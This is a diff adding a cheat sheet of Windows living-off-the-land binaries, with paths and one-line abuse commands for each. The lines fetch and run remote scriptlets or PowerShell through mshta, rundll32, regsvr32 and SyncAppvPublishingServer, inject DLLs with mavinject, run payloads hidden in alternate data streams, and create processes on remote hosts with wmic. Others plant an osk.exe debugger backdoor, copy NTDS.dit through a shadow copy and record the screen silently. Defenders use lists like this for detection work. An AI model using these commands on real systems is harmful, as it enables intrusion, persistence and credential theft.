@@ -1,0 +1,333 @@
+Execution - ATBroker
+C:\Windows\System32\Atbroker.exe
+C:\Windows\SysWOW64\Atbroker.exe
+ATBroker.exe /start malware
+
+Execution - BASH
+bash.exe -c calc.exe
+
+Execution - BITSADMIN (Pending)
+c:\windows\system32\bitsadmin.exe
+c:\windows\sysWOW64\bitsadmin.exe
+
+
+Execution - CMSTP
+cmstp.exe /ni /s c:\cmstp\CorpVPN.inf 
+
+
+Execution - CONTROL
+C:\Windows\system32\control.exe    
+C:\Windows\sysWOW64\control.exe  
+control.exe c:\windows\tasks\file.txt:evil.dll
+
+Execution - CSCRIPT (Pending)
+c:\windows\system32\cscript.exe
+c:\windows\sysWOW64\cscript.exe
+cscript c:\ads\file.txt:script.vbs
+
+
+Execution - DFSVC(Pending)
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe    
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe
+
+
+Execution - DNSCMD	
+c:\windows\system32\Dnscmd.exe
+c:\windows\sysWOW64\Dnscmd.exe
+dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll
+
+Execution - EXTEXPORT	
+C:\Program Files\Internet Explorer\Extexport.exe    
+C:\Program Files\Internet Explorer(x86)\Extexport.exe
+Notes: Place mozcrt19.dll, mozsqlite3.dll, sqlite3.dll inside the c:\test folder
+Extexport.exe c:\test foo bar
+
+
+Execution - EXPLORER
+explorer.exe calc.exe
+
+Execution - FORFILES
+C:\Windows\system32\forfiles.exe
+C:\Windows\sysWOW64\forfiles.exe
+forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe     
+forfiles /p c:\windows\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe" 
+
+Execution - HH
+c:\windows\system32\hh.exe
+c:\windows\sysWOW64\hh.exe
+HH.exe http://www.google.com      
+HH.exe C:\    
+HH.exe c:\windows\system32\calc.exe    
+HH.exe http://some.url/script.ps1   
+
+Execution - IEEXEC
+c:\windows\system32\ieexec.exe
+c:\windows\sysWOW64\ieexec.exe
+ieexec.exe http://x.x.x.x:8080/bypass.exe
+
+Execution - INFDEFAULTINSTALL
+c:\windows\system32\Infdefaultinstall.exe
+c:\windows\sysWOW64\Infdefaultinstall.exe
+InfDefaultInstall.exe Infdefaultinstall.inf
+
+Execution - INSTALLUTIL
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
+InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
+
+Execution - MAVINJECT
+C:\Windows\System32\mavinject.exe
+C:\Windows\SysWOW64\mavinject.exe
+MavInject.exe <PID> /INJECTRUNNING <PATH DLL>
+MavInject.exe 3110 /INJECTRUNNING c:\folder\evil.dll     
+mavinject.exe 4172 /INJECTRUNNING "c:\ads\file.txt:file.dll"
+
+
+Execution - MSBUILD
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Msbuild.exe
+msbuild.exe pshell.xml   
+msbuild.exe Msbuild.csproj 
+
+Execution - MSDT
+C:\Windows\System32\Msdt.exe    
+C:\Windows\SysWOW64\Msdt.exe   
+msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE  
+
+Execution - MSHTA
+C:\Windows\System32\mshta.exe
+C:\Windows\SysWOW64\mshta.exe
+mshta.exe evilfile.hta    
+mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))    
+mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();     
+mshta "C:\ads\file.txt:file.hta"
+
+Execution - MSIEXEC
+c:\windows\system32\msiexec.exe
+c:\windows\sysWOW64\msiexec.exe
+msfvenom -f msi -p windows/exec CMD=powershell.exe > powershell.msi  
+msiexec /quiet /i cmd.msi    
+msiexec /q /i http://192.168.100.3/tmp/cmd.png   
+msiexec /y "C:\folder\evil.dll"   
+msiexec /z "C:\folder\evil.dll" 
+
+Execution - NETSH
+c:\windows\system32\netsh.exe
+c:\windows\sysWOW64\netsh.exe
+netsh trace start capture=yes filemode=append persistent=yes tracefile=\\server\share\file.etl    
+netsh trace show status    
+netsh.exe add helper C:\Path\file.dll
+
+Execution - ODBCCONF
+c:\windows\system32\odbcconf.exe    
+c:\windows\sysWOW64\odbcconf.exe
+odbcconf -f file.rsp
+
+
+Execution - OPENWITH
+c:\windows\system32\Openwith.exe
+c:\windows\sysWOW64\Openwith.exe
+OpenWith.exe /c C:\test.hta   
+OpenWith.exe /c C:\testing.msi 
+
+Execution - PCALUA
+c:\windows\system32\pcalua.exe
+pcalua.exe -a calc.exe    
+pcalua.exe -a \\server\payload.dll    
+pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java
+
+Execution - PCWRUN
+c:\windows\system32\pcwrun.exe
+Pcwrun.exe c:\temp\beacon.exe
+
+Execution - POWERSHELL
+C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+powershell -ep bypass - < c:\temp:ttt 
+
+Execution - PRESENTATIONHOST
+c:\windows\system32\PresentationHost.exe     
+c:\windows\sysWOW64\PresentationHost.exe
+Presentationhost.exe C:\temp\Evil.xbap
+
+Execution - REGASM
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe
+regasm.exe /U AllTheThingsx64.dll
+
+Execution - REGISTER-CIMPROVIDER
+c:\windows\system32\Register-cimprovider.exe
+c:\windows\sysWOW64\Register-cimprovider.exe
+Register-cimprovider -path "C:\folder\evil.dll"
+
+Execution - REGSVCS
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe
+regsvcs.exe AllTheThingsx64.dll
+
+Execution - REGSVR32
+C:\Windows\System32\regsvr32.exe
+C:\Windows\SysWOW64\regsvr32.exe
+regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll    
+regsvr32.exe /s /u /i:file.sct scrobj.dll  
+
+Execution - RUNDLL32
+C:\Windows\System32\rundll32.exe
+C:\Windows\SysWOW64\rundll32.exe
+rundll32.exe AllTheThingsx64,EntryPoint    
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
+rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
+rundll32 "C:\ads\file.txt:ADSDLL.dll",DllMain  
+
+Execution - RUNONCE
+c:\windows\system32\runonce.exe
+c:\windows\sysWOW64\runonce.exe
+Runonce.exe /AlternateShellStartup 
+1. Create HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components[YOURKEY]
+2. Create two Strings : a) @ : Hi from Active Setup b) StubPath : calc.exe
+
+
+Execution - RUNSCRIPTHELPER
+C:\Windows\WinSxS\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.15_none_c2df1bba78111118\Runscripthelper.exe    
+C:\Windows\WinSxS\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.192_none_ad4699b571e00c4a\Runscripthelper.exe     
+runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test
+
+
+Execution - SC
+c:\windows\system32\sc.exe
+c:\windows\sysWOW64\sc.exe
+sc create evilservice binPath= "\"c:\ADS\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto     
+sc start evilservice     
+
+Execution - SCRIPTRUNNER
+c:\windows\system32\scriptrunner.exe
+c:\windows\sysWOW64\scriptrunner.exe
+Scriptrunner.exe -appvscript calc.exe   
+ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"  
+
+Execution - SYNCAPPVPUBLISHINGSERVER
+C:\Windows\System32\SyncAppvPublishingServer.exe
+SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
+
+
+Execution - WAB
+C:\Program Files\Windows Mail\wab.exe    
+C:\Program Files (x86)\Windows Mail\wab.exe 
+Wab.exe (requires registry changes)
+HKLM\Software\Microsoft\WAB\DLLPath
+
+Execution - WMIC
+c:\windows\system32\wbem\wmic.exe
+c:\windows\sysWOW64\wbem\wmic.exe
+wmic process call create calc    
+wmic process call create '"c:\ads\file.txt:program.exe"'
+wmic useraccount get /ALL    
+wmic process get caption,executablepath,commandline     
+wmic qfe get description,installedOn /format:csv    
+wmic /node:"192.168.0.1" service where (caption like "%sql server (%")    
+get-wmiobject –class "win32_share" –namespace "root\CIMV2" –computer "targetname"    
+wmic /user:<username> /password:<password> /node:<computer_name> process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"    
+wmic /NODE: "192.168.0.1" process call create "evil.exe"    
+wmic /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM c:\GoogleUpdate.exe ^> c:\notGoogleUpdateResults.txt"    
+wmic /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"    
+wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"    
+wmic os get /format:"MYXSLFILE.xsl"    
+wmic process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"
+
+Execution - WSCRIPT
+c:\windows\system32\wscript.exe
+c:\windows\sysWOW64\wscript.exe
+wscript c:\ads\file.txt:script.vbs
+
+Execution - XWIZARD
+c:\windows\system32\xwizard.exe
+c:\windows\sysWOW32\xwizard.exe
+xwizard.exe     
+xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
+
+Execution - APPVLP
+C:\Program Files\Microsoft Office\root\client\appvlp.exe       
+C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe 
+AppVLP.exe \\webdav\calc.bat   
+AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe', '', '', 'open', 1)"    
+AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')" 
+
+Execution - BGINFO
+bginfo.exe bginfo.bgi /popup /nolicprompt    
+"\\10.10.10.10\webdav\bginfo.exe" bginfo.bgi /popup /nolicprompt    
+"\\live.sysinternals.com\Tools\bginfo.exe" \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt  
+
+Execution - CDB
+C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe
+C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\cdb.exe
+cdb.exe -cf x64_calc.wds -o notepad.exe
+
+Execution - CSI
+csi.exe file
+
+Execution - DNX
+dnx.exe consoleapp
+
+Execution - DXCAP
+Visual Studio Needs to be Installed
+Dxcap.exe -c C:\Windows\System32\notepad.exe  
+
+Execution - MFTRACE
+C:\Program Files (x86)\Windows Kits\10\bin\x86
+C:\Program Files (x86)\Windows Kits\10\bin\x64
+Mftrace.exe cmd.exe     
+Mftrace.exe powershell.exe 
+Notes: Mftrace.exe only needs Mfdetours.dll in same folder to work.
+
+Execution - MSDEPLOY
+C:\Program Files (x86)\IIS\Microsoft Web Deploy V3\msdeploy.exe
+msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="c:\temp\calc.bat"
+
+Execution - MSXSL
+msxsl.exe customers.xml script.xsl
+
+Execution - RCSI
+rcsi.exe bypass.csx
+
+SQLDUMPER
+C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe   
+C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis Services\AS OLEDB\140\SQLDumper.exe   
+sqldumper.exe 464 0 0x0110:40    
+sqldumper.exe 540 0 0x01100 
+
+
+Execution - SQLPS
+C:\Program Files (x86)\Microsoft SQL Server\130\Tools\Binn\SQLToolsPS.exe -noprofile -command Start-Process calc
+PS SQLSERVER> (New-Object net.webclient).downloadfile("http://<source file URL>","<local save path>")
+PS SQLSERVER> ii <downloaded executable>
+C:\Program files (x86\Microsoft SQL Server\100\Tools\Binn\sqlps.exe
+Sqlps.exe -noprofile
+
+Execution - VSJITDEBUGGER
+c:\windows\system32\vsjitdebugger.exe
+Vsjitdebugger.exe calc.exe
+
+Execution - WINWORD
+winword.exe /l dllfile.dll
+
+Execution - GPUP
+C:\Program Files (x86)\Notepad++\updater\gpup.exe
+Gpup.exe -w whatever -e c:\Windows\System32\calc.exe
+
+Execution - CITRIX
+C:\Program Files (x86)\Citrix\ICA Client\Drivers64\Usbinst.exe
+Usbinst.exe InstallHinfSection "DefaultInstall 128 c:\temp\citrix.inf"
+
+Compiler
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe
+csc -out:My.exe File.cs
+
+Recording
+C:\Windows\System32\Psr.exe
+C:\Windows\SysWOW64\Psr.exe
+psr.exe /start /gui 0 /output c:\users\user\out.zip    
+psr.exe /start /maxsc 100 /gui 0 /output c:\users\user\out.zip    
+psr.exe /stop
